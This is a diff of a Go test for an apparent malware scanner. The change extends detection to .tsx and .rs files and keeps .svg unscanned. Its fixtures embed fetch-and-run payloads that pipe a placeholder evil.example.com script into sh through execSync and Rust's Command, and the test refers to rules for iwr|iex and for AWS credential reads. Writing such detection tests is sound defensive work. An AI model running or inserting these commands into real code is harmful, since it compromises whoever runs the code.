@@ -534,9 +534,21 @@ func TestExecutableExtensionsAreScanned(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(dir, "hook.cjs"), []byte(cjs), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	// Still an asset by design — widening to .tsx needs its own corpus regen.
-	if err := os.WriteFile(filepath.Join(dir, "component.tsx"),
-		[]byte("// curl -s https://evil.example.com/x.sh | sh\n"), 0o644); err != nil {
+	// Source languages (#187): a payload moved into a component or a crate
+	// used to be an asset, invisible to every rule.
+	tsx := "import { execSync } from 'child_process';\n" +
+		"export const Setup = () => { execSync('curl -s https://evil.example.com/x.sh | sh'); return null; };\n"
+	if err := os.WriteFile(filepath.Join(dir, "component.tsx"), []byte(tsx), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	rs := "use std::process::Command;\n" +
+		"fn main() { Command::new(\"sh\").arg(\"-c\").arg(\"curl -s https://evil.example.com/x.sh | sh\").status().unwrap(); }\n"
+	if err := os.WriteFile(filepath.Join(dir, "lib.rs"), []byte(rs), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	// Inert media stays an asset: the same bytes in an .svg are not scanned.
+	if err := os.WriteFile(filepath.Join(dir, "logo.svg"),
+		[]byte("<svg><!-- curl -s https://evil.example.com/x.sh | sh --></svg>\n"), 0o644); err != nil {
 		t.Fatal(err)
 	}
 
@@ -555,15 +567,16 @@ func TestExecutableExtensionsAreScanned(t *testing.T) {
 		{"install.bat", "SG-NET-002"}, // iwr | iex — the Windows pipe-to-shell
 		{"install.bat", "SG-SEC-001"}, // reads %USERPROFILE%\.aws\credentials
 		{"hook.cjs", "SG-NET-002"},    // curl | sh inside a CommonJS hook
+		{"component.tsx", "SG-NET-002"},
+		{"lib.rs", "SG-NET-002"},
 	} {
 		if !byFile[want.file][want.rule] {
 			t.Errorf("%s in %s was not detected; findings for that file: %v",
 				want.rule, want.file, byFile[want.file])
 		}
 	}
-	if len(byFile["component.tsx"]) != 0 {
-		t.Errorf("component.tsx is expected to stay an unscanned asset until its own "+
-			"measured widening; got %v", byFile["component.tsx"])
+	if len(byFile["logo.svg"]) != 0 {
+		t.Errorf("logo.svg is inert media and must stay an unscanned asset; got %v", byFile["logo.svg"])
 	}
 }
 
